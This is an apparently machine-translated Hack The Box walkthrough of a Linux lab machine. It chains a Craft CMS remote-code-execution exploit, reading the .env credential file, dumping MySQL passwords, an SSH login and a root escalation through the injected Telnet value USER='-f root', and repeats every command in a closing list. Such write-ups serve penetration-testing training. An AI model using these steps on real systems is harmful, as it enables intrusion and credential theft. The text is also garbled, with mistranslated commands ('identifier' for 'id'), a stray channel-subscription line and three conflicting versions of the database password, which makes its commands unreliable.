**Author: 0xE1P**

**Platform:** Hack The Box  
**Difficulty:** Simple  
**Operating system:** Linux  
**Date of publication:** 02.09.2026  
**The author:** calibr

---

## 📌 Summary

| Parameter | Value |
|----------|----------|
| **IP address** | `10.129.93.166` |
| **OS** | Linux |
| **Login** | CVE-2025-32432 (CraftCMS RCE) → MySQL → SSH |
| **Professional development** | CVE-2026-24061 (Telnet) |
| **Restore** | root |

---

## 🔍 1. Reconnaissance

``bash
nmap -sC -sV -p- 10.129.93.166
Open ports:

text
22/tcp SSH OpenSSH 8.2p1
80/tcp HTTP nginx 1.24.0
➡ 2. Web — CraftCMS
On the /admin/login page via the app:

text
Craft CMS 5.6.16
Use → CVE-2025-32432 (Pre-registered RCE).

We use exploit.py:

bash
python3 exploit.py -u http://orion.htb -c "identifier"
Result:

text-based
uid=33(www-data) gid=33(www-data) groups=33(www-data)
➡️ 3. MySQL password from .env
Reading .env:

bash
python3 exploit.py -u http://orion.htb -c "cat /var/www/html/craft/.env"
We find:

text
CRAFT_DB_PASSWORD=Ultra-secure CRAFT123 password!
We connect to MySQL and get the password of the user adam:

blow
python3 exploit.py -u http://orion.htb -c "mysql -u root -p' Supersecraft123pass!" -D orion -e "SELECT a user password";
Subscribe to John or Lily heshkat's channel → author: darkangel

4 4. SSH — see you Adam
Bash
ssh adam@10.129.93.166
Password: darkangel
🔐 5. Privilege Escalation — Telnet
We are looking at the local ports:

bash
netstat -tulpn | grep 23
Result:

text
tcp 0 0 127.0.0.1:23 0.0.0.0:* LISTEN
Source: GNU inetutils 2.7 — name CVE-2026-24061.

We get root through the environment variable:

bash
env USER='-f root' telnet -a 127.0.0.1
🏁 6.
Hitting the flags
with a cat /home/adam/user.txt the
cat /root/root.txt
🧾 7. All teams
bash
nmap -sC -sV -p- 10.129.93.166
python3 exploit.py -u http://orion.htb -
with the python3 "identifier" exploit.py -u http://orion.htb -c "cat /var/www/html/craft/.env"
python3 exploit.py -u http://orion.htb -c "mysql -u root -p' Supersecurecraft123pass!' -D orion -e 'TO SELECT A password FROM users;'"
ssh adam@10.129.93.166
netstat -tulpn | grep 23
env USER='-f root' telnet -a 127.0.0.1
cat /home/adam/user.txt
cat /root/root.txt
